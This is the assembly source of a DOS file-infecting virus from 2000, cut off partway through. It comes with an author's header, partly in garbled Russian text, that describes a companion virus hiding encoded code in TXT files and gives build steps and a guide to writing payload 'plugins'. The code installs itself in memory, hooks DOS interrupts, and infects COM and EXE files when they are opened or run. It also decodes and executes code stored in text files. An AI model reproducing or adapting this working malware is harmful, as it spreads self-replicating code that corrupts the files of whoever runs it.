   ; COMMENT %
   ;
   ;         Yeah! The world's first TXT virus! Actually, there are two
   ;   viruses - COM.EXE.TSR and TXT.TSR. The first virus waits for
   ;   opening of any TXT-file and then reads some bytes from the end
   ;   of this file, decrypts it and checks up the CRC. The good CRC
   ;   means that TXT-file is infected by the second virus. In this
   ;   case the first virus installs the second virus into memory and
   ;   hooks Int 21h. After that both viruses work separately from
   ;   each other.
   ;
   ;    “à ! ‘¢¥àè¨«®áì! * ª®¥æ-â® ã ¬¥ï ¤®è«¨ àãª¨ ¤®  ¯¨á ¨ï íâ®© ¤®ªã¬¥â æ¨¨
   ; (à ¤ã©â¥áì: â¥¯¥àì ¢ ¬ ¥ ¯à¨©¤¥âáï à §¡¨à âì ¨áå®¤¨ª ¤«ï â®£® çâ®¡ë ã§ âì,
   ; çâ® ï áª«¥¯ «   íâ®â à §). € ¢à¥¬ï   íâ® ¤¥«® ã ¬¥ï  è«®áì «¨èì ¯®â®¬ã, çâ®
   ; §¨¬  ¢ íâ®¬ £®¤ã ¢á¥-â ª¨  áâã¯¨«  (ª ª ¨ áâà ®), ¨ ¯à¨ â ª®© â¥¬¯¥à âãà¥
   ;   ã«¨æ¥ á¥©ç á «®¢¨âì ¥ç¥£®. *ã « ¤®. * §£®¢®àë ® ¯®£®¤¥ ï ¯à¨¡¥à¥£ã ¤«ï
   ; ¤àã£®£® á«ãç ï (  á«ãç ¨-â® ¡ë¢ îâ à §ë¥), â ª çâ® ª ¤¥«ã.
   ;    *¥à¥¤ ¢ ¬¨ ¥ ª ª ï-¨¡ã¤ì åã©ï,   á ¬ë©  áâ®ïé¨© TXT ¢¨àãá - ¬¥çâ  ¬®£¨å
   ; ¯®ª®«¥¨© ¢¨à¬í©ª¥à®¢. •®âï ï £®î: TXT ¢¨àãá  å®¤¨âáï ¢ ¤àã£®¬ ä ©«¥,   ¢
   ; íâ®¬ - COM.EXE.TSR ¢¨àãá. ‚®â ® ¥¬ ï á¥©ç á ¨ à ááª ¦ã. *â®â á ¬ë© ¢¨àãá ¨¬¥¥â
   ; ®¤ã § ¬¥ç â¥«ìãî á¯®á®¡®áâì: ® ã¬¥¥â § ¯ãáª âì ª®¤, § è¨äà®¢ ë© ¢ ¯à®áâëå
   ; â¥ªáâ®¢ëå ä ©« å. ’¥å¨ç¥áª ï áâ®à®  ¢®¯à®á  â ª®¢ : § à ¦¥ë© â¥ªáâ®¢ë© ä ©«
   ; ¯à¥¤áâ ¢«ï¥â á®¡®© ®¡ëçë© â¥ªáâ ¯«îá ª®¤, ª ¦¤ë© ¡ ©â ª®â®à®£® § è¨äà®¢ 
   ; á¯¥æ¨ «ìë¬  «£®à¨â¬®¬. ‚ ª®æ¥ ä ©«   å®¤ïâáï ¥é¥ ç¥àëà¥ ¡ ©â  - ¤«¨  ª®¤ 
   ; ¨ ª®âà®«ì ï áã¬¬  - â®¦¥ § è¨äà®¢ ë¥. €«£®à¨â¬ è¨äà®¢ª¨ ®ç¥ì ¯à®áâ: ª ¦¤ë©
   ; ¡ ©â ª®¤  ¯à¥¤áâ ¢«¥ ¢ ¢¨¤¥ ¢®áì¬¨ ¡ ©â®¢, ª®â®àë¥ ¯à¨¨¬ îâ § ç¥¨¥ «¨¡® 00,
   ; «¨¡® FF. ‚¥è¥ íâ® ¢ë£«ï¤¨â ¯à®áâ® ª ª ¡®«ìè®¥ ª®«¨ç¥áâ¢® ¯à®¡¥«®¢.
   ;    Š®£¤  î§¥à ®âªàë¢ ¥â § à ¦¥ë© â¥ªáâ®¢ë© ä ©«,  è COM.EXE.TSR ¢¨àãá (¥á«¨,
   ; ª®¥ç®, ® ã¦¥  å®¤¨âáï ¢ ¯ ¬ïâ¨) áç¨âë¢ ¥â ¨§ ª®æ  íâ®£® ä ©«  ¤«¨ã ª®¤ 
   ; ¨ ª®âà®«ìãî áã¬¬ã ¨ à áè¨äà®¢ë¢ ¥â ¨å. ‡ â¥¬ ® ¢ë¤¥«ï¥â ã¦®¥ ª®«¨ç¥áâ¢®
   ; ¯ ¬ïâ¨, ¤®ç¨âë¢ ¥â ¨§ ä ©«  ª®¤, à áè¨äà®¢ë¢ ¥â ¥£®, à §¬¥é ¥â ¢ ¢ë¤¥«¥®©
   ; ¯ ¬ïâ¨, áç¨â ¥â ª®âà®«ìãî áã¬¬ã ¨, ¥á«¨ ®  ®ª § « áì ¯à ¢¨«ì®©, ¯¥à¥¤ ¥â
   ; ª®¤ã ã¯à ¢«¥¨¥. …á«¨ ¯®á«¥ ®âà ¡®âª¨ ª®¤  ä« £ CF ®ª ¦¥âáï á¡à®è¥, â® ¢¨àãá
   ; ®á¢®¡®¦¤ ¥â à ¥¥ ¢ë¤¥«¥ãî ¯ ¬ïâì, ¥á«¨ ¦¥ ä« £ CF ãáâ ®¢«¥, â® ¯à®áâ®
   ; ¯¥à¥¤ ¥â ã¯à ¢«¥¨¥ ®¯¥à æ¨®®© á¨áâ¥¬¥.
   ;    ’¥¯¥àì ¤®«£®¦¤ ë© (ï  ¤¥îáì) à ááª § ¯à® TXT ¢¨àãá. Ž ¯®«ãç ¥â
   ; ã¯à ¢«¥¨¥ á¯®á®¡®¬, ®¯¨á ë¬ ¢ëè¥. „ «¥¥ ® ¯à®¢¥àï¥â  «¨ç¨¥ á¢®¥© ª®¯¨¨
   ; ¢ ¯ ¬ïâ¨, ¨, ¥á«¨ ®  ®¡ àã¦¥ , â® á¡à áë¢ ¥â ä« £ CF ¨ § ¢¥àè ¥â á¢®î
   ; à ¡®âã. ‚ ¯à®â¨¢®¬ á«ãç ¥ ¯¥à¥áâ ¢«ï¥â   á¥¡ï ¢¥ªâ®à Int 21h ¨ ¯®¤¨¬ ¥â
   ; ä« £ CF (çâ®¡ë ¥ ¡ëâì ¢ë£àã¦¥ë¬ ¨§ ¯ ¬ïâ¨). *®á«¥ íâ®£® ® ¢¥¤¥â á¥¡ï, ª ª
   ; ®¡ëçë© ä ©«®¢ë© ¢¨àãá, á â¥¬ «¨èì ®â«¨ç¨¥¬, çâ® § à ¦ ¥â â®«ìª® â¥ªáâ®¢ë¥
   ; ä ©«ë (ãª § ë¬ ¢ëè¥ á¯®á®¡®¬ - è¨äàã¥â á¥¡ï ¨ ¤®¯¨áë¢ ¥âáï ¢ ª®¥æ ¢¬¥áâ¥
   ; á à §¬¥à®¬ ª®¤  ¨ ª®âà®«ì®© áã¬¬®©). €âà¨¡ãâë, ¤ âã ¨ ¢à¥¬ï á®§¤ ¨ï ä ©« 
   ; TXT ¢¨àãá ¥ á®åà ï¥â - «®¬ «® â ª¨¥ ¬¥«®ç¨ ¯¨á âì.
   ;    *® ¢¥à¥¬áï ª COM.EXE.TSR ¢¨àãáã. *â® ¢¯®«¥ ¯®«®æ¥ë© ¢¨àãá. ‡ à ¦ ¥â
   ; ä ©«ë ¯à¨ ®âªàëâ¨¨ ¨ § ¯ãáª¥. Ž¡à ¡ âë¢ ¥â ä ©«ë á  âà¨¡ãâ®¬ "ReadOnly". *¥
   ; ¨§¬¥ï¥â  âà¨¡ãâë, ¤ âã ¨ ¢à¥¬ï á®§¤ ¨ï ä ©« . *¥ £«îç¨â   § é¨é¥ëå ®â
   ; § ¯¨á¨ ¤¨áª¥â å. Š®àà¥ªâ® § à ¦ ¥â COM ä ©«ë ¤«ï Windows - RUSNS, ENUNS ¨
   ; â.¯. *¥ ¯®àâ¨â NewEXE ä ©«ë. *¥ § à ¦ ¥â ä ©«ë ¯®¢â®à®: ã COM ä ©«®¢ ¬¥âª 
   ; § à ¦¥®áâ¨ - ª®¬ ¤  "jmp" ¢ á ¬®¬  ç «¥, ã EXE ä ©«®¢ - ç¨á«® 6666h ¢
   ; § £®«®¢ª¥ ¢ ¯®«¥ ª®âà®«ì®© áã¬¬ë.
   ;    ‚¨¬ ¨¥! …é¥ ®¤¨ ¢ ¦ë© ¬®¬¥â! ‚ë ã¦¥,  ¢¥à®¥, ¤®£ ¤ «¨áì, çâ® ¢
   ; § à ¦¥ëå â¥ªáâ®¢ëå ä ©« å ¬®¦¥â  å®¤¨âìáï ¥ â®«ìª® ¬®© å¢ «¥ë© TXT ¢¨àãá,
   ;   ¢®®¡é¥ «î¡®© ª®¤. ˆë¬¨ á«®¢ ¬¨, ¬®¦® ¯¨á âì ¯« £¨ë (íâ®  §¢ ¨¥ ¥ ®ç¥ì
   ; ¯®¤å®¤¨â, ® ¤àã£®£® ï ¥ ¯à¨¤ã¬ «). *« £¨ - íâ® ª®¤, ®¡à ¡®â ë© á¯¥æ¨ «ìë¬
   ; ®¡à §®¬ ¨ § ¯¨á ë© ¢ â¥ªáâ®¢ë© ä ©«. …á«¨ ª®¬¯ìîâ¥à § à ¦¥ ®¯¨á ë¬ ¢ëè¥
   ; COM.EXE.TSR ¢¨àãá®¬, â® ¯« £¨ë, ¯à¨è¥¤è¨¥   íâ®â ª®¬¯ìîâ¥à, ¡ã¤ãâ § ¯ãáª âìáï
   ;  ¢â®¬ â¨ç¥áª¨, áâ®¨â â®«ìª® î§¥àã ®âªàëâì § à ¦¥ë© ¯« £¨®¬ â¥ªáâ®¢ë© ä ©«.
   ; *ãª®¢®¤áâ¢® ¯®  ¯¨á ¨î ¯« £¨®¢:
   ;
   ;    1. *« £¨ - íâ® ®¡ëª®¢¥ë© ª®¤, ¡®«ìè¥ ¢á¥£® ¯®å®¦¨©   COM ä ©«. ’®«ìª®
   ;       ¢á¥ á¬¥é¥¨ï ¤®«¦ë ®âáç¨âë¢ âìáï ¥ ®â 100h (ª ª ¢ COM ä ©«¥),   ®â 0.
   ;       *®áâ ¢ìâ¥ ¢  ç «¥ ¨áå®¤¨ª  ¤¨à¥ªâ¨¢ã "org 0". Œ®¤¥«ì ¯ ¬ïâ¨ ¤®«¦  ¡ëâì
   ;       TINY.
   ;    2. ‚  ç «¥ ¯« £¨  ®¡ï§ â¥«ì® á®åà ï©â¥ ¢á¥ ¨á¯®«ì§ã¥¬ë¥ à¥£¨áâàë,  
   ;       ¢ ª®æ¥ - ¢®ááâ  ¢«¨¢ ©â¥ ¨å. ‚ëå®¤ ¨§ ¯« £¨  - "retf".
   ;    3. …á«¨ ¢ë ¯¨è¨â¥ à¥§¨¤¥âë© ¯« £¨, ¯¥à¥¤ ¢ëå®¤®¬ ãáâ  ¢«¨¢ ©â¥ ä« £ CF
   ;       (¯« £¨ ¥ ¡ã¤¥â ¢ë£àã¦¥ ¨§ ¯ ¬ïâ¨). ‚ ¯à®â¨¢®¬ á«ãç ¥ á¡à áë¢ ©â¥ CF.
   ;    4. ‚¬¥áâ® Int 21h «ãçè¥ ¢ë§ë¢ âì Int 65h - ¡ëáâà¥¥ ¡ã¤¥â à ¡®â âì. ‚¨¬ ¨¥!
   ;       …á«¨ ¢ë å®â¨â¥ ãáâ ®¢¨âì ¢¥ªâ®à ª ª®£®-¨¡ã¤ì ¯à¥àë¢ ¨ï, â® ¤«ï íâ®©
   ;       æ¥«¨ ¨á¯®«ì§ã©â¥ â®«ìª® Int 21h - ¨ ç¥ Windows ¬®¦¥â ¯à®£«îç¨âì. ‚¥ªâ®à
   ;       Int 65h ¬¥ïâì ¥«ì§ï - ® ¨á¯®«ì§ã¥âáï COM.EXE.TSR ¢¨àãá®¬.
   ;    5. ‘ª®¬¯¨«¨àã©â¥ ¯« £¨ ¢ EXE ä ©«. *®â®¬ áª®¢¥àâ¨àã©â¥ ¥£® ¢ BIN á ¯®¬®éìî
   ;       EXE2BIN ¨ § â¥¬ ®¡à ¡®â ©â¥ ¥£® ¯à¨« £ ¥¬®© ãâ¨«¨â®© BIN2TXT. *®«ãç¥ë©
   ;       â¥ªáâ®¢ë© ä ©« ¬®¦® § ª¨¤ë¢ âì ª ¦¥àâ¢¥   ª®¬¯ìîâ¥à. ‚ ¥£®  ç «® ¬®¦®
   ;       § ¯¨á âì ª ª®©-¨¡ã¤ì â¥ªáâ - íâ® ¨ª ª ¥ ¯®¢«¨ï¥â   à ¡®âã.
   ;
   ;    *ã ¢®â, ¯®¦ «ã©, ¨ ¢á¥. ‚¨¤¨¬®, íâ® ¬®ï ¯®á«¥¤ïï à ¡®â  ¢ ®¡« áâ¨ DOS
   ; â¥å®«®£¨©. ‚®®¡é¥-â® ï ã¦¥ ¤®¢®«ì® ¤ ¢®  ç « ¯à®£à ¬¬¨à®¢ âì ¯®¤ Windows
   ; (¨ áª®à® ¢ë ã¢¨¤¨â¥ ¬®¨ ¯à®¤ãªâë ¯®¤ íâã ®¯¥à æ¨®ªã), ® ã¦ ®ç¥ì ¬¥ å®â¥«®áì
   ;  ¯¨á âì á¨¥ ¨§¢à é¥¨¥, çâ® ï, á®¡áâ¢¥®, ¨ á¤¥« «. „® áª®àëå ¢áâà¥ç!
   ;
   ;                                   DJ Sadovnikov (http://i.am/djsad), 24.11.2000
   ;
   ;  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;
   ;                Š®¬¯¨«¨à®¢ âì á ¯®¬®éìî TASM 4.1+
   ;
   ;                   tasm /m txtvir1.asm
   ;                   tlink /x txtvir1.obj
   ;                   del txtvir1.obj
   ;
   ;
   ;                ” ©«ë ¨§  àå¨¢ :
   ;
   ;                   txtvir1.asm   17000 (¢¨àãá TxtVirusA.918)
   ;                   txtvir1.exe    1463 (® ¦¥ ®âª®¬¯¨«¨à®¢ ë©)
   ;                   txtvir2.asm    4000 (¢¨àãá TxtVirusB.3280)
   ;                   txtvir2.txt    3280 (® ¦¥ ®âª®¬¯¨«¨à®¢ ë©)
   ;                   example1.asm    730 (¯à¨¬¥à ¥à¥§¨¤¥â®£® ¯« £¨ )
   ;                   example1.txt    416 (® ¦¥ ®âª®¬¯¨«¨à®¢ ë©)
   ;                   example2.asm    810 (¯à¨¬¥à à¥§¨¤¥â®£® ¯« £¨ )
   ;                   example2.txt    448 (® ¦¥ ®âª®¬¯¨«¨à®¢ ë©)
   ;                   bin2txt.pas     851 (ª®¢¥àâ¥à BIN ¢ TXT)
   ;                   bin2txt.exe    3968 (® ¦¥ ®âª®¬¯¨«¨à®¢ ë©)
   ; %
   ;
   ;
   ;
   ;
   ;

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   DEBUG = 0   ; 0 - ¢¨àãá à¥ £¨àã¥â   COM, EXE ¨ TXT ä ©«ë
           ; 1 - ¢¨àãá à¥ £¨àã¥â   COO, EXX ¨ TXX ä ©«ë


           .286
   Code        segment use16
           assume  cs:Code, ds:Code

   Start:      mov ah, 9
           mov dx, offset Msg+100h
           int 21h
           mov ax, 4C00h
           int 21h

   Msg     db  'Virus has started...$'

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Virus:      pusha
           push    ds es

           call    Entry
   Entry:      pop si
           sub si, Entry-Virus


   ;[*à®¢¥àï¥¬  «¨ç¨¥ ¢¨àãá  ¢ ¯ ¬ïâ¨]

           mov ax, 0ABCDh
           int 21h
           cmp ax, 0CDABh
           je  Exit


   ;[“ª®à ç¨¢ ¥¬ ¤«¨ã â¥ªãé¥£® ¡«®ª  ¯ ¬ïâ¨]

           mov ax, ds
           dec ax
           mov ds, ax
           mov bx, ds:[3]
           sub bx, MemSize+1
           mov ah, 4Ah
           int 21h
           jc  Exit


   ;[‘®åà ï¥¬  ¤à¥á áâ à®£® ®¡à ¡®âç¨ª  Int 21h]

           mov ax, 3521h
           int 21h
           mov cs:[Ofs21h-Virus+si], bx
           mov cs:[Seg21h-Virus+si], es


   ;[*¥à¥áâ ¢«ï¥¬ Int 21h   Int 65h]

           mov ax, 2565h
           mov dx, bx
           push    es
           pop ds
           int 21h


   ;[‚ë¤¥«ï¥¬ ¯ ¬ïâì ¤«ï ¢¨àãá ]

           mov ah, 48h
           mov bx, MemSize
           int 21h
           jc  Exit
           mov es, ax


   ;[*®¬¥ç ¥¬ ¡«®ª ¯ ¬ïâ¨ ª ª á¨áâ¥¬ãî ®¡« áâì]

           dec ax
           mov ds, ax
           mov ds:[1], word ptr 8


   ;[Š®¯¨àã¥¬ ¢¨àãá ¢ ¢ë¤¥«¥ãî ¯ ¬ïâì]

           cld
           push    cs
           pop ds
           mov cx, CodeSize
           xor di, di
           push    si
           rep movsb
           pop si


   ;[“áâ  ¢«¨¢ ¥¬ á¢®© ®¡à ¡®âç¨ª Int 21h]

           mov ax, 2521h
           mov dx, Int21h-Virus
           push    es
           pop ds
           int 21h


   ;[Ž¯à¥¤¥«ï¥¬, ¨§ ª ª®£® ä ©«  ¬ë áâ àâ®¢ «¨]

   Exit:       push    cs
           pop ds es
           mov ax, es
           mov bx, cs
           cmp ax, bx
           jne ExitEXE


   ;[Žâ¤ ¥¬ ã¯à ¢«¥¨¥ § à ¦¥®© ¯à®£à ¬¬¥ COM]

   ExitCOM:    mov ax, ds:[Old3b-Virus+si]
           mov ds:[100h], ax
           mov al, ds:[Old3b+2-Virus+si]
           mov ds:[102h], al
           pop ds
           popa
           push    100h
           ret


   ;[Žâ¤ ¥¬ ã¯à ¢«¥¨¥ § à ¦¥®© ¯à®£à ¬¬¥ EXE]

   ExitEXE:    add ax, 10h
           add ds:[OldCS-Virus+si], ax
           add ds:[OldSS+1-Virus+si], ax
           pop ds
           popa
           jmp $+2

           cli
   OldSS:      mov sp, 0
           mov ss, sp
   OldSP:      mov sp, 0
           sti

           db  0EAh
   OldIP       dw  0
   OldCS       dw  0

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ










   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                              Ž**€*Ž’—ˆŠˆ
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Int24h:     mov al, 3
           iret


   Int21h:     cmp ax, 0ABCDh
           jne NoTest
           xchg    ah, al
           iret


   NoTest:     pusha
           push    ds es

           cmp ah, 3Dh
           je  Begin
           cmp ah, 4Bh
           jne BadFunc


   ;[‘®åà ï¥¬ ¢¥ªâ®à Int 24h]

   Begin:      mov ax, 3524h
           int 65h
           push    es
           push    bx


   ;[“áâ  ¢«¨¢ ¥¬ á¢®© ®¡à ¡®âç¨ª Int 24h]

           push    ds dx
           mov ax, 2524h
           mov dx, Int24h-Virus
           call    Int65h
           pop dx ds


   ;[ˆé¥¬ ª®¥æ ¨¬¥¨ ä ©« ]

           mov si, dx
   SeekZero:   inc si
           cmp ds:[si], byte ptr 0
           jne SeekZero


   ;[Ž¯à¥¤¥«ï¥¬ â¨¯ ä ©« ]

           cmp ds:[si-4], byte ptr '.'
           jne Quit
           mov di, Extns-Virus
           call    TestExt
           je  ProcessCE
           call    TestExt
           je  ProcessCE
           call    TestExt
           jne Quit
           jmp ProcessTXT


   ;[‚®ááâ  ¢«¨¢ ¥¬ ¢¥ªâ®à Int 24h]

   Quit:       mov ax, 2524h
           pop dx
           pop ds
           int 65h


   ;[*¥à¥¤ ¥¬ ã¯à ¢«¥¨¥ á«¥¤ãîé¥¬ã ®¡à ¡®âç¨ªã]

   BadFunc:    pop es ds
           popa

           db  0EAh
   Ofs21h      dw  0
   Seg21h      dw  0

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[‘®åà ï¥¬  âà¨¡ãâë ä ©« ]

   ProcessCE:  mov ax, 4300h
           int 65h
           jc  Quit
           push    cx
           push    dx
           push    ds


   ;[Ž¡ã«ï¥¬  âà¨¡ãâë ä ©« ]

           mov ax, 4301h
           xor cx, cx
           int 65h
           jc  RestAttr


   ;[Žâªàë¢ ¥¬ ä ©«]

           mov ax, 3D02h
           int 65h
           jc  RestAttr
           xchg    bx, ax


   ;[‘®åà ï¥¬ ¤ âã ¨ ¢à¥¬ï á®§¤ ¨ï ä ©« ]

           mov ax, 5700h
           int 65h
           jc  Close
           push    cx
           push    dx


   ;[‘ç¨âë¢ ¥¬ ¯¥à¢ë¥ ¤¢  ¡ ©â  ä ©« ]

           mov cx, 2
           mov dx, Temp-Virus
           call    Read
           jc  RestTime


   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì ¢  ç «® ä ©« ]

           call    SeekStart
           jc  RestTime


   ;[*à®¢¥àï¥¬ â¨¯ ä ©«  ¨ ¥£® § à ¦¥®áâì]

           mov ax, ds:[Temp-Virus]
           cmp ax, 'ZM'
           je  InfectEXE
           cmp al, 0E9h
           je  RestTime
           jmp InfectCOM


   ;[‚®ááâ  ¢«¨¢ ¥¬ ¤ âã ¨ ¢à¥¬ï á®§¤ ¨ï ä ©« ]

   RestTime:   mov ax, 5701h
           pop dx
           pop cx
           int 65h


   ;[‡ ªàë¢ ¥¬ ä ©«]

   Close:      mov ah, 3Eh
           int 65h


   ;[‚®ááâ  ¢«¨¢ ¥¬  âà¨¡ãâë ä ©« ]

   RestAttr:   mov ax, 4301h
           pop ds
           pop dx
           pop cx
           int 65h
           jmp Quit

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[‘ç¨âë¢ ¥¬ § £®«®¢®ª EXE]

   InfectEXE:  mov cx, 19h
           mov dx, Buffer-Virus
           call    Read
           jc  RestTime


   ;[*à®¢¥àï¥¬, § à ¦¥ «¨ ä ©«]

           cmp ds:[Buffer+12h-Virus], 6666h
           je  RestTime
           cmp ds:[Buffer+18h-Virus], byte ptr 40h
           je  RestTime
           mov ds:[Buffer+12h-Virus], 6666h


   ;[*à®¢¥àï¥¬, á®¤¥à¦¨â «¨ ä ©« ®¢¥à«¥©]

           call    GetFSize
           jc  RestTime
           call    Calc
           cmp ds:[Buffer+4-Virus], ax
           jne RestTime
           cmp ds:[Buffer+2-Virus], dx
           jne RestTime


   ;[‚ëç¨á«ï¥¬ ¤«¨ã ä ©«  á ¢¨àãá®¬ ¨ ¢®á¨¬ ¥¥ ¢ § £®«®¢®ª]

           call    GetFSize
           jc  RestTime
           add ax, CodeSize
           adc dx, 0
           call    Calc
           mov ds:[Buffer+4-Virus], ax
           mov ds:[Buffer+2-Virus], dx


   ;[‘®åà ï¥¬ SS, SP, CS ¨ IP]

           mov ax, ds:[Buffer+0Eh-Virus]
           mov ds:[OldSS+1-Virus], ax
           mov ax, ds:[Buffer+10h-Virus]
           mov ds:[OldSP+1-Virus], ax
           mov ax, ds:[Buffer+16h-Virus]
           mov ds:[OldCS-Virus], ax
           mov ax, ds:[Buffer+14h-Virus]
           mov ds:[OldIP-Virus], ax


   ;[Š®àà¥ªâ¨àã¥¬ â®çªã ¢å®¤  ¨  ¤à¥á áâ¥ª ]

           call    GetFSize
           jc  RestTime
           mov cx, 16
           div cx
           sub ax, ds:[Buffer+08h-Virus]
           mov ds:[Buffer+16h-Virus], ax
           mov ds:[Buffer+14h-Virus], dx
           mov ds:[Buffer+0Eh-Virus], ax
           mov ds:[Buffer+10h-Virus], CodeSize+100h


   ;[‡ ¯¨áë¢ ¥¬ ¢¨àãá ¢ ä ©«]

           mov cx, CodeSize
           call    WriteVirus
           jc  RestTimeA


   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì ¢  ç «® ä ©« ]

           call    SeekStart
           jc  RestTimeA


   ;[‡ ¯¨áë¢ ¥¬ ®¢ë© § £®«®¢®ª]

           mov cx, 19h
           mov dx, Buffer-Virus
           call    Write
   RestTimeA:  jmp RestTime

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[‘ç¨âë¢ ¥¬ âà¨ ¡ ©â ]

   InfectCOM:  mov cx, 3
           mov dx, Old3b-Virus
           call    Read
           jc  RestTimeA


   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì   7 ¯®§¨æ¨© ®â ª®æ  ä ©« ]

           mov dx, -7
           call    SeekEnd
           jc  RestTimeA
           add ax, 7
           adc dx, 0


   ;[*à®¢¥àï¥¬ ¤«¨ã ä ©«  ¨ ¢ëç¨á«ï¥¬  ¤à¥á ¯¥à¥å®¤ ]

           or  dx, dx
           jnz RestTimeA
           cmp ax, 0FF00h-CodeSize
           jae RestTimeA
           sub ax, 3
           jc  RestTimeA
           mov ds:[New3b+1-Virus], ax


   ;[‘ç¨âë¢ ¥¬ á¥¬ì ¡ ©â]

           mov cx, 7
           mov dx, XXXNS-Virus
           call    Read
           jc  RestTimeA


   ;[Š®àà¥ªâ¨àã¥¬ XXXNS]

           mov cx, CodeSize
           cmp ds:[XXXNS+3-Virus], 'SN'
           jne Skip1
           add cx, 7
           add ds:[XXXNS+5-Virus], cx


   ;[‡ ¯¨áë¢ ¥¬ ¢¨àãá ¢ ä ©«]

   Skip1:      call    WriteVirus
           jc  RestTimeA


   ;[*¥à¥¬¥é ¥¬ ãª § â¥«ì ¢  ç «® ä ©« ]

           call    SeekStart
           jc  RestTimeA


   ;[‡ ¯¨áë¢ ¥¬ ª®¬ ¤ã ¯¥à¥å®¤    ¢¨àãá]

           mov cx, 3
           mov dx, New3b-Virus
           call    Write
           jmp RestTime

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[Žâªàë¢ ¥¬ ä ©«]

   ProcessTXT: mov ax, 3D00h
           int 65h
           jnc Skip2
           jmp Quit
   Skip2:      xchg    bx, ax


   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì   32 ¡ ©â  ®â ª®æ  ä ©« ]

           mov dx, -32
           call    SeekEnd
           jc  CloseA


   ;[‘ç¨âë¢ ¥¬ à §¬¥à ¤ ¬¯  ¨ ª®âà®«ìãî áã¬¬ã]

           call    CvtByte
           jc  CloseA
           mov ds:[FSize-Virus], al
           call    CvtByte
           jc  CloseA
           mov ds:[FSize+1-Virus], al
           call    CvtByte
           jc  CloseA
           mov ds:[Crc-Virus], al
           call    CvtByte
           jc  CloseA
           mov ds:[Crc+1-Virus], al


   ;[‚ë¤¥«ï¥¬ ¯ ¬ïâì ¯®¤ ¤ ¬¯]

           push    bx
           mov ah, 48h
           mov bx, ds:[FSize-Virus]
           shr bx, 4
           inc bx
           int 65h
           pop bx
           jc  CloseA


   ;[*®¬¥ç ¥¬ ¡«®ª ¯ ¬ïâ¨ ª ª á¨áâ¥¬ãî ®¡« áâì]

           push    ax
           dec ax
           mov es, ax
           mov es:[1], word ptr 8
           pop es


   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì    ç «® ¤ ¬¯ ]

           mov dx, ds:[FSize-Virus]
           add dx, 4
           shl dx, 3
           neg dx
           call    SeekEnd
           jc  Release


   ;[*à¥®¡à §®¢ë¢ ¥¬ ¤ ¬¯ ¢ ®à¬ «ìë© ª®¤]

           cld
           xor bp, bp
           xor di, di
   Loop1:      call    CvtByte
           jc  Release
           mov ah, 0
           add bp, ax
           stosb
           cmp di, ds:[FSize-Virus]
           jne Loop1


   ;[*à®¢¥àï¥¬ ª®âà®«ìãî áã¬¬ã]

           cmp bp, ds:[Crc-Virus]
           jne Release


   ;[*¥à¥¤ ¥¬ ã¯à ¢«¥¨¥ ª®¤ã]

           mov ds:[SegCode-Virus], es
           jmp $+2
           db  9Ah
           dw  0
   SegCode     dw  0
           jc  CloseA


